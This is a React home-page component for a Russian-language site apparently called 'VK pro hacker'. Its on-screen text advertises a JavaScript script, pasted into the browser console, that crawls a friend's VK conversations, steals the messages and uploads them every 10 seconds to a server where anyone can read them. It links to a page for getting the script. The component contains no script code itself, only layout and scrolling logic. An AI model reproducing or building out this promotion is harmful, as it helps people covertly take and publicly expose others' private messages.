import React from "react";
import { Link } from "react-router-dom";
import bg from "@assets/images/main-bg.jpg";
import code_img from "@assets/images/code.jpg";

import "./home.scss";

export default class Home extends React.Component {
	constructor () {
		super();
	}

	// scroll page to second block after fullscreen block
	scrollToBottom = () => {
		const y = this.second_screen_ref.getBoundingClientRect().top + window.pageYOffset - 70;
		console.log(this.second_screen_ref.getBoundingClientRect().top);
		window.scrollTo({ top: y, behavior: "smooth" });
	};

	render () {
		return (
			<div className="home">
				<div className="home__fullscreen full-screen">
					<div className="full-screen__image" style={{ background: `url(${bg})` }} />

					<div className="home__introducing">
						<h1 className="home__title">Узнай всю правду!</h1>
						<div className="home__sub-title">
							Попробуй украсть переписку вашего друга с помощью JS скрипта и консоли
							браузера!
						</div>
					</div>

					<div className="home__to-bottom" onClick={this.scrollToBottom}>
						{/* <span className="home__details">Подробнее</span> */}
						<div className="bottom-arrow">
							<span />
							<span />
							<span />
						</div>
					</div>
				</div>
				<div className="home__content" ref={ref => (this.second_screen_ref = ref)}>
					<h1 className="home__block-title">VK профи хакер</h1>

					<section className="home__section home__section-script">
						<div className="home__section-wrapper container">
							<div className="home__section-illustration">
								<img src={code_img} alt="script image" />
							</div>
							<div className="home__section-content">
								<h2 className="home__section-title">Как это работает?</h2>
								<div className="home__section-description">
									Мы даём вам скрипт, который будет перемещаться по перепискам
									вашего друга и воровать сообщения ;) Далее скрипт каждые 10
									секунд отправляет данные на сервер, где любой может просмотреть
									эти данные.
								</div>
								<div className="home__section-link-wrapper">
									<Link to="/get_script" className="home__section-link">
										Получить скрипт
									</Link>
								</div>
							</div>
						</div>
					</section>

					<h1 className="home__block-title">Инструкия</h1>

					<section className="home__section home__section-">
						<div className="home__section-wrapper container">
							<div className="home__section-illustration">
								<img src={code_img} alt="script image" />
							</div>
							<div className="home__section-content">
								<h2 className="home__section-title">Как это работает?</h2>
								<div className="home__section-description">
									Мы даём вам скрипт, который будет перемещаться по перепискам
									вашего друга и воровать сообщения ;) Далее скрипт каждые 10
									секунд отправляет данные на сервер, где любой может просмотреть
									эти данные
								</div>
							</div>
						</div>
					</section>
				</div>
			</div>
		);
	}
}
